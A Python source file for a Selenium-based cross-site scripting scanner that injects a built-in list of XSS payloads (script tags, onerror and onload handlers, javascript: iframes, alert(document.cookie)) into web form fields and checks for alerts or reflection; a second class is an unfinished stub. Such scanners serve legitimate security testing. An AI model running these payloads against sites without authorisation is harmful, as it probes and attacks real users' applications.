from urllib.parse import urljoin
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import logging

class XSSScanner:
    def __init__(self, driver, payloads=None):
        """
        Initialize the XSS scanner with configurable payloads.
        Args:
            driver: Selenium WebDriver instance.
            payloads (list, optional): List of XSS payloads. Defaults to a predefined list.
        """
        self.driver = driver
        self.payloads = payloads or [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "'\"><svg/onload=alert('XSS')>",
            "\" onmouseover=\"alert('XSS')\"",
            "<svg><script>alert('XSS')</script></svg>",  # Bypass filters
            "<iframe src=javascript:alert('XSS')>",  # DOM-based XSS
        ]
        self.payloads += [
            "<script>document.write('XSS')</script>",
            "<img src='x' onerror='alert(document.cookie)'>",
            "'><iframe src=javascript:alert('XSS')>",
            "<svg/onload=alert(document.domain)>",
        ]

    def test_xss(self, form, url):
        """Test a form for XSS vulnerabilities."""
        if not self._validate_form(form):
            logging.warning(f"Invalid form structure at {url}. Skipping XSS test.")
            return False

        # Get the form action URL
        action = form.get("action")
        if not action:
            action = url
        else:
            action = urljoin(url, action)

        # Prepare the data to submit
        inputs = form.get("inputs", [])
        data = {}
        for input_field in inputs:
            name = input_field.get("name")
            if name:
                data[name] = "test"  # Default value

        # Test each payload
        for payload in self.payloads:
            logging.info(f"Testing payload: {payload} on {action}")
            for input_name in data:
                # Inject the payload into each input field
                modified_data = data.copy()
                modified_data[input_name] = payload

                # Submit the form using Selenium
                self.driver.get(action)
                for field_name, value in modified_data.items():
                    try:
                        input_element = self.driver.find_element(By.NAME, field_name)
                        input_element.clear()
                        input_element.send_keys(value)
                    except Exception as e:
                        logging.warning(f"Could not find input field {field_name}: {e}")
                        continue

                # Submit the form
                try:
                    submit_button = self.driver.find_element(By.XPATH, "//form//input[@type='submit']")
                    submit_button.click()
                except Exception as e:
                    logging.warning(f"Could not submit form: {e}")
                    continue

                # Check if the payload is executed (e.g., alert appears)
                try:
                    WebDriverWait(self.driver, 2).until(EC.alert_is_present())
                    alert = self.driver.switch_to.alert
                    alert_text = alert.text
                    alert.accept()
                    if "XSS" in alert_text:
                        logging.warning(f"Potential XSS vulnerability found at {action} with payload: {payload}")
                        print(f"Potential XSS vulnerability found at {action} with payload: {payload}")
                        return True
                except Exception as e:
                    logging.debug(f"No alert found for payload {payload}: {e}")

                # Check if the payload is reflected in the response
                if payload in self.driver.page_source:
                    logging.warning(f"Potential XSS vulnerability found at {action} with payload: {payload}")
                    print(f"Potential XSS vulnerability found at {action} with payload: {payload}")
                    return True

                # Check for DOM-based XSS
                if "XSS" in self.driver.execute_script("return document.body.innerHTML"):
                    logging.warning(f"Potential DOM-based XSS vulnerability found at {action} with payload: {payload}")
                    print(f"Potential DOM-based XSS vulnerability found at {action} with payload: {payload}")
                    return True
                if "alert" in self.driver.execute_script("return document.body.innerHTML") or \
                   "alert" in self.driver.execute_script("return document.title"):
                    logging.warning(f"Potential DOM-based XSS vulnerability found at {action} with payload: {payload}")
                    print(f"Potential DOM-based XSS vulnerability found at {action} with payload: {payload}")
                    return True

        return False

    def _validate_form(self, form):
        """
        Validate the structure of the form.

        Args:
            form (dict): The form to validate.

        Returns:
            bool: True if the form is valid, False otherwise.
        """
        return bool(form.get("inputs") and form.get("action"))

class AdvancedXSSScanner:
    def __init__(self, driver):
        self.driver = driver
        self.payloads = self.load_payloads()

    def load_payloads(self):
        """Load advanced XSS payloads from a file or database."""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            # Add more advanced payloads here...
        ]

    def test_xss(self, form, url):
        """Test a form for XSS vulnerabilities with advanced techniques."""
        if not self._validate_form(form):
            logging.warning(f"Invalid form structure at {url}. Skipping advanced XSS test.")
            return False

        for payload in self.payloads:
            # Inject payloads dynamically based on input type
            # Use advanced response analysis
            # Implement bypass techniques
            pass
        return False

    def _validate_form(self, form):
        """
        Validate the structure of the form.

        Args:
            form (dict): The form to validate.

        Returns:
            bool: True if the form is valid, False otherwise.
        """
        return bool(form.get("inputs") and form.get("action"))